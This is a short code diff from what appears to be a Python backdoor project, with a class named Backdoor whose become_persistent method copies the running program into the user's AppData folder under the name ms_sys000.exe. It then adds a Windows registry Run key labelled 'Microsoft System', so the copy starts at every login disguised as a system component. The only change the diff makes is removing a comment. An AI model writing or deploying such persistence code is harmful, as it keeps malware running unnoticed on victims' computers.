@@ -20,7 +20,7 @@ class Backdoor:
     def become_persistent(self):
         malicious_file_location = os.environ["appdata"] + "\\ms_sys000.exe"
         if not os.path.exists(malicious_file_location):
-            shutil.copyfile(sys.executable, malicious_file_location)  # Use __file__ instead if using raw .py file.
+            shutil.copyfile(sys.executable, malicious_file_location)
             # TODO: Consider changing f-strings in the whole project to basic concatenation for backward compatibility.
             subprocess.call(f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run '
                             f'/v Microsoft System /t REG_SZ /d "{malicious_file_location}"', shell=True)
